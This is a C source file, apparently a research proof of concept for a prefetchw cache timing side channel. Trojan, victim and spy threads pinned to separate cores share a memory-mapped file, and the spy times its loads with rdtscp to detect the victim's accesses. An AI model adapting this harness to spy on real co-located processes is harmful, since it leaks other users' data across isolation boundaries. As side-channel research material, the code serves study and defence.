#define _GNU_SOURCE
#include <math.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

#define trojan_core 0
#define spy_core 2
#define victim_core 1


pthread_mutex_t lock1 = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t cond1 = PTHREAD_COND_INITIALIZER;
pthread_mutex_t lock2 = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t cond2 = PTHREAD_COND_INITIALIZER;
pthread_mutex_t lock3 = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t cond3 = PTHREAD_COND_INITIALIZER;
int id01 = 0; 
int id12 = 0;
int id20 = 1;

/* this is from Mastik by Yuval Yarom */
static inline uint32_t memaccesstime(void *v) {
  uint32_t rv;
  asm volatile("mfence\n"
               "lfence\n"
               "rdtscp\n"
               "mov %%eax, %%esi\n"
               "mov (%1), %%eax\n"
               "rdtscp\n"
               "sub %%esi, %%eax\n"
               : "=&a"(rv)
               : "r"(v)
               : "ecx", "edx", "esi");
  return rv;
}


static inline uint32_t rdtscp()
{
    uint32_t rv;
    asm volatile("rdtscp" : "=a"(rv)::"edx", "ecx");
    return rv;
}

//troj, vicim, and spy thread run sequentially in each iteration.
//This is achieved with three pthread locks.

void *troj_func(int *param) {
  int i = 0;
  while (i < 100000) {
    pthread_mutex_lock(&lock1);
    while (id01 != 0) {
      pthread_cond_wait(&cond1, &lock1);
    }
    pthread_mutex_lock(&lock3);
    while (id20 != 1) {
      pthread_cond_wait(&cond3, &lock3);
    }
    /* do prefetch */
    __builtin_prefetch(param, 1, 3);
    asm volatile("mfence");
    i++;
    id01 = 1;
    id20 = 0;
    pthread_cond_signal(&cond1);
    pthread_mutex_unlock(&lock1);
    pthread_cond_signal(&cond3);
    pthread_mutex_unlock(&lock3);
  }
}

void *victim_func(int *param) {
  int i = 0;
  int time = 0;
  while (i < 100000) {
    pthread_mutex_lock(&lock1);
    while (id01 != 1) {
      pthread_cond_wait(&cond1, &lock1);
    }
    pthread_mutex_lock(&lock2);
    while (id12 != 0) {
      pthread_cond_wait(&cond2, &lock2);
    }
    //Victim loads in every other iteration.
    if (i%2 == 0)
    {
        time = memaccesstime(param);
        printf("accessed ");
    }
    else
        printf("notaccessed ");
    i++;
    id01 = 0;
    id12 = 1;
    pthread_cond_signal(&cond1);
    pthread_mutex_unlock(&lock1);
    pthread_cond_signal(&cond2);
    pthread_mutex_unlock(&lock2);
  }
}

void *spy_func(int *param) {
  int i = 0;
  int time = 0;
  while (i < 100000) {
    pthread_mutex_lock(&lock2);
    while (id12 != 1) {
      pthread_cond_wait(&cond2, &lock2);
    }
    pthread_mutex_lock(&lock3);
    while (id20 != 0) {
      pthread_cond_wait(&cond3, &lock3);
    }
    //Spy loads and times the load in each iteration. 
    time = memaccesstime(param);
    printf("%d\n", time);
    i++;
    id12 = 0;
    id20 = 1;
    pthread_cond_signal(&cond2);
    pthread_mutex_unlock(&lock2);
    pthread_cond_signal(&cond3);
    pthread_mutex_unlock(&lock3);
  }
}

int main(int argc, char *argv[]) {
  pthread_t trojan, victim, spy;
  printf("%s\n", "Starting\n");

  char*file = "shared";
  int fd = open(file, O_RDONLY);
  if (fd < 0)
      return 0;

  char *mapaddr = mmap(0, 4096, PROT_READ, MAP_SHARED, fd, 0);
  close(fd);

  
  //Accesses the target addr a few times so ensure prefetchw executes correctly.
  //If the addr is never loaded before, prefetchw sometimes does not work.
  int time;
  time = memaccesstime(mapaddr);
  time = memaccesstime(mapaddr);

  pthread_attr_t attr_troj, attr_victim, attr_spy;
  pthread_attr_init(&attr_troj);
  pthread_attr_init(&attr_victim);
  pthread_attr_init(&attr_spy);

  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET(trojan_core, &mask);
  if (pthread_attr_setaffinity_np(&attr_troj, sizeof(mask), &mask) != 0) {
    perror("pthread_attr_setaffinity_np: trojan");
  }

  CPU_ZERO(&mask);
  CPU_SET(victim_core, &mask);
  if (pthread_attr_setaffinity_np(&attr_victim, sizeof(mask), &mask) != 0) {
    perror("pthread_attr_setaffinity_np: victim");
  }

  CPU_ZERO(&mask);
  CPU_SET(spy_core, &mask);
  if (pthread_attr_setaffinity_np(&attr_spy, sizeof(mask), &mask) != 0) {
    perror("pthread_attr_setaffinity_np: spy");
  }


  if (pthread_create(&trojan, &attr_troj, (void *)troj_func, mapaddr) != 0) {
    perror("pthread_create: trojan");
  }
  if (pthread_create(&victim, &attr_victim, (void *)victim_func, mapaddr) != 0) {
    perror("pthread_create: victim");
  }
  if (pthread_create(&spy, &attr_spy, (void *)spy_func, mapaddr) != 0) {
    perror("pthread_create: spy");
  }

    pthread_join(trojan, NULL);
    pthread_join(victim, NULL);
    pthread_join(spy, NULL);

}
